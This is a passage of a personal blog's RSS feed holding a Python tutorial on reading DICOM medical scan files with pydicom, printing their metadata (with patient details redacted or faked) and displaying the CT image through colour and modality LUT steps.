<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Giovanni Pecoraro</title><link>https://www.peco602.com/</link><atom:link href="https://www.peco602.com/index.xml" rel="self" type="application/rss+xml"/><description>Giovanni Pecoraro</description><generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><lastBuildDate>Thu, 23 Feb 2023 00:00:00 +0000</lastBuildDate><image><url>https://www.peco602.com/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_3.png</url><title>Giovanni Pecoraro</title><link>https://www.peco602.com/</link></image><item><title>DICOM images in Python: An overview</title><link>https://www.peco602.com/post/0090-python-dicom/</link><pubDate>Thu, 23 Feb 2023 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0090-python-dicom/</guid><description>&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>DICOM or Digital Imaging and Communications in medicine are image files sourced from different modalities, e.g., CT or MRI scans, and based on an &lt;a href="https://www.dicomstandard.org/" target="_blank" rel="noopener">international standard&lt;/a> to transmit, store, retrieve, print, process, and display medical imaging information. DICOM files do not only contain the image, but also additional data, such as the patient identifier, date of birth, age, sex, and any other useful information about the diagnosis. Obviousely, DICOM files cannot be viewed as normal photos, so several DICOM viewers are available online (a list is available &lt;a href="https://technologyadvice.com/blog/healthcare/5-dicom-viewers/" target="_blank" rel="noopener">here&lt;/a>), but, as always, Python can be very powerful in case additional processing is needed.&lt;/p>
&lt;h2 id="pre-requisites">Pre-requisites&lt;/h2>
&lt;p>First, the following libraries are required:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>&lt;a href="https://pypi.org/project/pydicom/" target="_blank" rel="noopener">Pydicom&lt;/a>&lt;/strong>: DICOM files reading and decoding library&lt;/li>
&lt;li>&lt;strong>&lt;a href="https://numpy.org/install/" target="_blank" rel="noopener">Numpy&lt;/a>&lt;/strong>: Array manipulation library&lt;/li>
&lt;li>&lt;strong>&lt;a href="https://pypi.org/project/Pillow/2.2.2/" target="_blank" rel="noopener">Pillow&lt;/a>&lt;/strong>: Image processing library&lt;/li>
&lt;li>&lt;strong>&lt;a href="https://matplotlib.org/stable/users/installing/index.html" target="_blank" rel="noopener">Matplotlib&lt;/a>&lt;/strong>: Image visualization library&lt;/li>
&lt;/ul>
&lt;p>and can be easily installed via the command:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">pip install pydicom numpy pillow matplotlib
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="data-structure">Data structure&lt;/h2>
&lt;p>Once the Python environment is ready and a DICOM file is available, it can be read via the &lt;a href="https://pydicom.github.io/pydicom/stable/reference/generated/pydicom.filereader.dcmread.html#pydicom.filereader.dcmread" target="_blank" rel="noopener">&lt;code>dcmread()&lt;/code>&lt;/a> method.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pydicom&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">dcmread&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">DICOM_PATH&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;/home/user/Desktop/exam/MD44PKO2/T2T5OLJX/I7600000&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ds&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">dcmread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">DICOM_PATH&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">type&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ds&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>pydicom.dataset.FileDataset
&lt;/code>&lt;/pre>
&lt;p>This method returns a &lt;a href="https://pydicom.github.io/pydicom/stable/reference/generated/pydicom.dataset.FileDataset.html#pydicom.dataset.FileDataset" target="_blank" rel="noopener">&lt;code>FileDataset&lt;/code>&lt;/a> instance, which in turn represents an extension of &lt;a href="https://pydicom.github.io/pydicom/stable/reference/generated/pydicom.dataset.Dataset.html#pydicom.dataset.Dataset" target="_blank" rel="noopener">&lt;code>Dataset&lt;/code>&lt;/a> class. It makes reading and writing to file easier and wraps a dictionary of &lt;a href="https://pydicom.github.io/pydicom/stable/reference/generated/pydicom.dataelem.DataElement.html#pydicom.dataelem.DataElement" target="_blank" rel="noopener">&lt;code>DataElement&lt;/code>&lt;/a>. A &lt;code>DataElement&lt;/code> is then composed of the following parts:&lt;/p>
&lt;ul>
&lt;li>a &lt;code>tag&lt;/code> that identifies the attribute, usually in the format (XXXX,XXXX) with hexadecimal numbers, and may be divided further into DICOM Group Number and DICOM Element Number;&lt;/li>
&lt;li>a &lt;code>Value Representation (VR)&lt;/code> that describes the data type and format of the attribute value.&lt;/li>
&lt;li>a &lt;code>Value Multiplicity (VM)&lt;/code> that is automatically determined from the contents of the value.&lt;/li>
&lt;li>a &lt;code>value&lt;/code> which can be one of:
&lt;ul>
&lt;li>a regular numeric, string or text value as an int, float, str, bytes, etc&lt;/li>
&lt;li>a list of regular values (if &lt;code>VM&lt;/code>&amp;gt;1)&lt;/li>
&lt;li>a &lt;a href="https://pydicom.github.io/pydicom/stable/reference/generated/pydicom.sequence.Sequence.html#pydicom.sequence.Sequence" target="_blank" rel="noopener">&lt;code>Sequence&lt;/code>&lt;/a> instance, where a &lt;code>Sequence&lt;/code> is a list of &lt;code>Dataset&lt;/code> instances, where each Dataset contains DataElement instances, and so on&amp;hellip;&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>You can display the entire dataset by simply printing its string (str or repr) value:&lt;/p>
&lt;!-- ```python
# TO BE COMMENTED
ds.remove_private_tags()
ds.PatientName = 'ROSSI^MARIO'
ds.PatientID = '99999999'
ds.PatientBirthDate = '19330101'
ds.PatientAge = '090Y'
ds.PatientAddress = 'XXXXXXXXXX'
ds.InstitutionName = 'XXXXXXXXXX'
ds.InstitutionAddress = 'XXXXXXXXXX'
``` -->
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ds&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>Dataset.file_meta -------------------------------
(0002, 0000) File Meta Information Group Length UL: 168
(0002, 0001) File Meta Information Version OB: b'\x00\x01'
(0002, 0002) Media Storage SOP Class UID UI: CT Image Storage
(0002, 0003) Media Storage SOP Instance UID UI: 1.3.12.2.1107.5.1.4.55050.30000022121515300815600002074
(0002, 0010) Transfer Syntax UID UI: Explicit VR Little Endian
(0002, 0012) Implementation Class UID UI: 1.2.840.113704.7.0.2
-------------------------------------------------
(0008, 0008) Image Type CS: ['DERIVED', 'SECONDARY', 'OTHER', 'CSA MPR', 'CSAPARALLEL', 'AXIAL', 'CT_SOM5 SEQ']
(0008, 0016) SOP Class UID UI: CT Image Storage
(0008, 0018) SOP Instance UID UI: 1.3.12.2.1107.5.1.4.55050.30000022121515300815600002074
(0008, 0020) Study Date DA: '20221215'
(0008, 0021) Series Date DA: '20221215'
(0008, 0022) Acquisition Date DA: '20221215'
(0008, 0023) Content Date DA: '20221215'
(0008, 0030) Study Time TM: '162614'
(0008, 0031) Series Time TM: '163202'
(0008, 0032) Acquisition Time TM: '162821.901196'
(0008, 0033) Content Time TM: '163202.921000'
(0008, 0050) Accession Number SH: '5895682501'
(0008, 0060) Modality CS: 'CT'
(0008, 0061) Modalities in Study CS: ['CT', 'SR']
(0008, 0070) Manufacturer LO: 'SIEMENS'
(0008, 0080) Institution Name LO: 'XXXXXXXXXX'
(0008, 0081) Institution Address ST: 'XXXXXXXXXX'
(0008, 0090) Referring Physician's Name PN: 'MEDICO^REFERTANTE'
(0008, 1010) Station Name SH: 'CT55050'
(0008, 1030) Study Description LO: 'TC CRANIO (CAPO)'
(0008, 1032) Procedure Code Sequence 1 item(s) ----
(0008, 0100) Code Value SH: 'RS0932'
(0008, 0104) Code Meaning LO: 'TC CRANIO (CAPO)'
---------
(0008, 103e) Series Description LO: 'ax ok'
(0008, 1048) Physician(s) of Record PN: '10440^NEUROLOGIA'
(0008, 1070) Operators' Name PN: 'meduser'
(0008, 1080) Admitting Diagnoses Description LO: '-'
(0008, 1090) Manufacturer's Model Name LO: 'Sensation 64'
(0008, 1140) Referenced Image Sequence 1 item(s) ----
(0008, 1150) Referenced SOP Class UID UI: CT Image Storage
(0008, 1155) Referenced SOP Instance UID UI: 1.3.12.2.1107.5.1.4.55050.30000022121515300815600001998
---------
(0008, 2111) Derivation Description ST: 'MEDCOM RESAMPLED'
(0010, 0010) Patient's Name PN: 'ROSSI^MARIO'
(0010, 0020) Patient ID LO: '99999999'
(0010, 0021) Issuer of Patient ID LO: 'X1V1_MPI'
(0010, 0030) Patient's Birth Date DA: '19330101'
(0010, 0040) Patient's Sex CS: 'M'
(0010, 1010) Patient's Age AS: '090Y'
(0010, 1040) Patient's Address CS: 'XXXXXXXXXX'
(0018, 0015) Body Part Examined CS: 'HEAD'
(0018, 0050) Slice Thickness DS: '0.6'
(0018, 0060) KVP DS: '120.0'
(0018, 1000) Device Serial Number LO: '55050'
(0018, 1020) Software Versions LO: 'syngo CT 2014A'
(0018, 1030) Protocol Name LO: 'CBM_encefalo_SEQ'
(0018, 1110) Distance Source to Detector DS: '1040.0'
(0018, 1111) Distance Source to Patient DS: '570.0'
(0018, 1120) Gantry/Detector Tilt DS: '0.0'
(0018, 1130) Table Height DS: '255.0'
(0018, 1140) Rotation Direction CS: 'CW'
(0018, 1160) Filter Type SH: '0'
(0018, 1170) Generator Power IS: '45'
(0018, 1190) Focal Spot(s) DS: '1.2'
(0018, 1200) Date of Last Calibration DA: '20221215'
(0018, 1201) Time of Last Calibration TM: '073319.000000'
(0018, 1210) Convolution Kernel SH: 'H10s'
(0018, 5100) Patient Position CS: 'HFS'
(0020, 000d) Study Instance UID UI: 1.2.840.113564.9.1.2015111110072131.20221209153953.25895682501
(0020, 000e) Series Instance UID UI: 1.3.12.2.1107.5.1.4.55050.30000022121515300815600001997
(0020, 0010) Study ID SH: 'CT20221215162611'
(0020, 0011) Series Number IS: '604'
(0020, 0012) Acquisition Number IS: None
(0020, 0013) Instance Number IS: '76'
(0020, 0032) Image Position (Patient) DS: [-86.56525199874, -359.7734375, -75.906572657132]
(0020, 0037) Image Orientation (Patient) DS: [0.97661555018595, 1.224606354e-016, -0.2149931792755, -1.19596961e-016, 1, 2.632820134e-017]
(0020, 0052) Frame of Reference UID UI: 1.3.12.2.1107.5.1.4.55050.30000022121506293760900002193
(0020, 1040) Position Reference Indicator LO: ''
(0020, 1208) Number of Study Related Instances IS: '546'
(0020, 4000) Image Comments LT: ''
(0028, 0002) Samples per Pixel US: 1
(0028, 0004) Photometric Interpretation CS: 'MONOCHROME2'
(0028, 0010) Rows US: 512
(0028, 0011) Columns US: 512
(0028, 0030) Pixel Spacing DS: [0.453125, 0.453125]
(0028, 0100) Bits Allocated US: 16
(0028, 0101) Bits Stored US: 12
(0028, 0102) High Bit US: 11
(0028, 0103) Pixel Representation US: 0
(0028, 1050) Window Center DS: [35, 700]
(0028, 1051) Window Width DS: [80, 3200]
(0028, 1052) Rescale Intercept DS: '-1024.0'
(0028, 1053) Rescale Slope DS: '1.0'
(0028, 1054) Rescale Type LO: 'HU'
(0028, 1055) Window Center &amp;amp; Width Explanation LO: ['WINDOW1', 'WINDOW2']
(0028, 2110) Lossy Image Compression CS: '00'
(0032, 1032) Requesting Physician PN: '10440^NEUROLOGIA'
(0032, 1060) Requested Procedure Description LO: 'TC CRANIO (CAPO)'
(0032, 1064) Requested Procedure Code Sequence 1 item(s) ----
(0008, 0100) Code Value SH: 'RS0932'
(0008, 0104) Code Meaning LO: 'TC CRANIO (CAPO)'
---------
(0040, 0275) Request Attributes Sequence 1 item(s) ----
(0040, 0007) Scheduled Procedure Step Descriptio LO: 'TC CRANIO (CAPO)'
(0040, 0008) Scheduled Protocol Code Sequence 1 item(s) ----
(0008, 0100) Code Value SH: 'RS0932'
(0008, 0102) Coding Scheme Designator SH: 'DSS_MESA'
(0008, 0104) Code Meaning LO: 'TC CRANIO (CAPO)'
---------
(0040, 0009) Scheduled Procedure Step ID SH: '5895682501'
---------
(0040, 1008) Confidentiality Code LO: 'N'
(0088, 0200) Icon Image Sequence 1 item(s) ----
(0028, 0002) Samples per Pixel US: 1
(0028, 0004) Photometric Interpretation CS: 'MONOCHROME2'
(0028, 0010) Rows US: 64
(0028, 0011) Columns US: 64
(0028, 0034) Pixel Aspect Ratio IS: [1, 1]
(0028, 0100) Bits Allocated US: 8
(0028, 0101) Bits Stored US: 8
(0028, 0102) High Bit US: 7
(0028, 0103) Pixel Representation US: 0
(7fe0, 0010) Pixel Data OB: Array of 4096 elements
---------
(6000, 0010) Overlay Rows US: 512
(6000, 0011) Overlay Columns US: 512
(6000, 0015) Number of Frames in Overlay IS: '1'
(6000, 0022) Overlay Description LO: 'Siemens MedCom Object Graphics'
(6000, 0040) Overlay Type CS: 'G'
(6000, 0050) Overlay Origin SS: [1, 1]
(6000, 0051) Image Frame Origin US: 1
(6000, 0100) Overlay Bits Allocated US: 1
(6000, 0102) Overlay Bit Position US: 0
(6000, 3000) Overlay Data OW: Array of 32768 elements
(7fe0, 0010) Pixel Data OW: Array of 524288 elements
&lt;/code>&lt;/pre>
&lt;p>You can access specific elements by their DICOM keyword or tag number. When using the tag number, a &lt;code>DataElement&lt;/code> instance is returned, so &lt;code>DataElement.value&lt;/code> must be used to get the value.&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>&lt;em>NOTE:&lt;/em>&lt;/strong> Some attributes values have been redacted or replaced with fake values for patient privacy.&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">ds&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PatientName&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>'ROSSI^MARIO'
&lt;/code>&lt;/pre>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">ds&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0x10&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x10&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">value&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>'ROSSI^MARIO'
&lt;/code>&lt;/pre>
&lt;p>If you don’t remember or know the exact element tag or keyword, the &lt;code>Dataset&lt;/code> class provides a handy &lt;code>dir()&lt;/code> method, useful during interactive sessions at the Python prompt. It will return any non-private element keywords in the dataset that have the specified string anywhere in the keyword (case insensitive).&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">ds&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">dir&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;pat&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>['DistanceSourceToPatient',
'ImageOrientationPatient',
'ImagePositionPatient',
'IssuerOfPatientID',
'PatientAddress',
'PatientAge',
'PatientBirthDate',
'PatientID',
'PatientName',
'PatientPosition',
'PatientSex']
&lt;/code>&lt;/pre>
&lt;p>Calling &lt;code>Dataset.dir()&lt;/code> without passing it an argument will return a list of all non-private element keywords in the dataset:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">ds&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">dir&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>['AccessionNumber',
'AcquisitionDate',
'AcquisitionNumber',
'AcquisitionTime',
'AdmittingDiagnosesDescription',
'BitsAllocated',
'BitsStored',
'BodyPartExamined',
'Columns',
'ConfidentialityCode',
'ContentDate',
'ContentTime',
'ConvolutionKernel',
'DateOfLastCalibration',
'DerivationDescription',
'DeviceSerialNumber',
'DistanceSourceToDetector',
'DistanceSourceToPatient',
'FilterType',
'FocalSpots',
'FrameOfReferenceUID',
'GantryDetectorTilt',
'GeneratorPower',
'HighBit',
'IconImageSequence',
'ImageComments',
'ImageFrameOrigin',
'ImageOrientationPatient',
'ImagePositionPatient',
'ImageType',
'InstanceNumber',
'InstitutionAddress',
'InstitutionName',
'IssuerOfPatientID',
'KVP',
'LossyImageCompression',
'Manufacturer',
'ManufacturerModelName',
'ModalitiesInStudy',
'Modality',
'NumberOfFramesInOverlay',
'NumberOfStudyRelatedInstances',
'OperatorsName',
'OverlayBitPosition',
'OverlayBitsAllocated',
'OverlayColumns',
'OverlayData',
'OverlayDescription',
'OverlayOrigin',
'OverlayRows',
'OverlayType',
'PatientAddress',
'PatientAge',
'PatientBirthDate',
'PatientID',
'PatientName',
'PatientPosition',
'PatientSex',
'PhotometricInterpretation',
'PhysiciansOfRecord',
'PixelData',
'PixelRepresentation',
'PixelSpacing',
'PositionReferenceIndicator',
'ProcedureCodeSequence',
'ProtocolName',
'ReferencedImageSequence',
'ReferringPhysicianName',
'RequestAttributesSequence',
'RequestedProcedureCodeSequence',
'RequestedProcedureDescription',
'RequestingPhysician',
'RescaleIntercept',
'RescaleSlope',
'RescaleType',
'RotationDirection',
'Rows',
'SOPClassUID',
'SOPInstanceUID',
'SamplesPerPixel',
'SeriesDate',
'SeriesDescription',
'SeriesInstanceUID',
'SeriesNumber',
'SeriesTime',
'SliceThickness',
'SoftwareVersions',
'StationName',
'StudyDate',
'StudyDescription',
'StudyID',
'StudyInstanceUID',
'StudyTime',
'TableHeight',
'TimeOfLastCalibration',
'WindowCenter',
'WindowCenterWidthExplanation',
'WindowWidth']
&lt;/code>&lt;/pre>
&lt;blockquote>
&lt;p>&lt;strong>&lt;em>NOTE:&lt;/em>&lt;/strong> You can also view DICOM files in a collapsible tree using the example program &lt;a href="https://github.com/pydicom/contrib-pydicom/blob/master/plotting-visualization/dcm_qt_tree.py" target="_blank" rel="noopener">dcm_qt_tree.py&lt;/a>.&lt;/p>
&lt;/blockquote>
&lt;h2 id="image-visualization">Image visualization&lt;/h2>
&lt;p>DICOM images pixel data is stored as raw bytes in the &lt;code>DataElement&lt;/code> associated to the &lt;code>PixelData&lt;/code> tag. &lt;code>PixelData&lt;/code> is often not immediately useful as data may be stored in a variety of different ways:&lt;/p>
&lt;ul>
&lt;li>The pixel values may be signed or unsigned integers, or floats&lt;/li>
&lt;li>There may be multiple image frames&lt;/li>
&lt;li>There may be multiple planes per frame (i.e., RGB) and the order of the pixels may be different&lt;/li>
&lt;li>The image data may be encoded using one of the available compression standards (1.2.840.10008.1.2.4.50 JPEG Baseline, 1.2.840.10008.1.2.5 RLE Lossless, etc). Encoded image data will also be encapsulated and each encapsulated image frame may be broken up into one or more fragments.&lt;/li>
&lt;/ul>
&lt;p>Because of the complexity in interpreting the pixel data, pydicom provides an easy way to get it in a convenient form: &lt;a href="https://pydicom.github.io/pydicom/stable/reference/generated/pydicom.dataset.Dataset.html#pydicom.dataset.Dataset.pixel_array" target="_blank" rel="noopener">&lt;code>Dataset.pixel_array&lt;/code>&lt;/a>. As an example, if the pixel data is compressed then &lt;code>pixel_array&lt;/code> will directly return the uncompressed data.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">matplotlib.pyplot&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="nn">plt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">arr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ds&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pixel_array&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">plt&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">imshow&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">arr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cmap&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">plt&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">cm&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">bone&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>&amp;lt;matplotlib.image.AxesImage at 0x7f5625845280&amp;gt;
&lt;/code>&lt;/pre>
&lt;p>
&lt;figure >
&lt;div class="d-flex justify-content-center">
&lt;div class="w-100" >&lt;img alt="png" srcset="
/post/0090-python-dicom/dicom_files/dicom_17_1_hu5cd3fcbac50ea0a3e37b2b8c02f36615_76432_a0d4e1be83f4cb0c55f87b7f4904ed80.webp 400w,
/post/0090-python-dicom/dicom_files/dicom_17_1_hu5cd3fcbac50ea0a3e37b2b8c02f36615_76432_bfde284ff4ca51548ee97668ef0a8d7e.webp 760w,
/post/0090-python-dicom/dicom_files/dicom_17_1_hu5cd3fcbac50ea0a3e37b2b8c02f36615_76432_1200x1200_fit_q75_h2_lanczos_3.webp 1200w"
src="https://www.peco602.com/post/0090-python-dicom/dicom_files/dicom_17_1_hu5cd3fcbac50ea0a3e37b2b8c02f36615_76432_a0d4e1be83f4cb0c55f87b7f4904ed80.webp"
width="430"
height="418"
loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>As it is possible to see, the picture details are not well-defined so the information content is quite poor. The following additional DICOM post-processing should be &lt;strong>sequentially&lt;/strong> performed in order to enhance the image content.&lt;/p>
&lt;h3 id="1-color-palette">1. Color Palette&lt;/h3>
&lt;p>Some DICOM datasets store their output image pixel values in a lookup table (LUT), where the values in Pixel Data are the index to a corresponding LUT entry. When a dataset’s (0028,0004) Photometric Interpretation value is PALETTE COLOR then the &lt;a href="https://pydicom.github.io/pydicom/stable/reference/generated/pydicom.pixel_data_handlers.util.html#pydicom.pixel_data_handlers.util.apply_color_lut" target="_blank" rel="noopener">&lt;code>apply_color_lut()&lt;/code>&lt;/a> function can be used to apply a palette color LUT to the pixel data to produce an RGB image.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pydicom.pixel_data_handlers.util&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">apply_color_lut&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;(0028,0004) Photometric Interpretation: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">ds&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0x28&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x4&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">rgb&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">apply_color_lut&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">arr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ds&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">plt&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">imshow&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">rgb&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cmap&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">plt&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">cm&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">bone&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">except&lt;/span> &lt;span class="ne">Exception&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>(0028,0004) Photometric Interpretation: MONOCHROME2
No suitable Palette Color Lookup Table Module found
&lt;/code>&lt;/pre>
&lt;p>This was expected since the &lt;em>Photometric Interpretation&lt;/em> is &lt;em>MONOCHROME2&lt;/em>, so no suitable Palette Color Lookup Table Module could found and the &lt;code>apply_color_lut&lt;/code> method fails.&lt;/p>
&lt;h3 id="2-modality-lut-or-rescale-operation">2. Modality LUT or Rescale Operation¶&lt;/h3>
&lt;p>The DICOM &lt;a href="http://dicom.nema.org/medical/dicom/current/output/chtml/part03/sect_C.11.html#sect_C.11.1" target="_blank" rel="noopener">Modality LUT&lt;/a> module converts raw pixel data values to a specific (possibly unitless) physical quantity, such as Hounsfield units for CT scan (as in this case). The &lt;a href="https://pydicom.github.io/pydicom/stable/reference/generated/pydicom.pixel_data_handlers.util.html#pydicom.pixel_data_handlers.util.apply_voi_lut" target="_blank" rel="noopener">&lt;code>apply_modality_lut()&lt;/code>&lt;/a> function can be used with an input array of raw values and a dataset containing a Modality LUT module to return the converted values. When a dataset requires multiple grayscale transformations, the Modality LUT transformation is always applied first.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pydicom.pixel_data_handlers.util&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">apply_modality_lut&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">arr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ds&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pixel_array&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">hu&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">apply_modality_lut&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">arr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ds&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">plt&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">imshow&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hu&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cmap&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">plt&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">cm&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">bone&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>&amp;lt;matplotlib.image.AxesImage at 0x7f5621d45d60&amp;gt;
&lt;/code>&lt;/pre>
&lt;p>
&lt;figure >
&lt;div class="d-flex justify-content-center">
&lt;div class="w-100" >&lt;img alt="png" srcset="
/post/0090-python-dicom/dicom_files/dicom_23_1_hu5cd3fcbac50ea0a3e37b2b8c02f36615_76432_7f7e419c08ca4d6a615088a8bc0c5603.webp 400w,
/post/0090-python-dicom/dicom_files/dicom_23_1_hu5cd3fcbac50ea0a3e37b2b8c02f36615_76432_ecb72cbaa6e095d8999258131f5453ec.webp 760w,
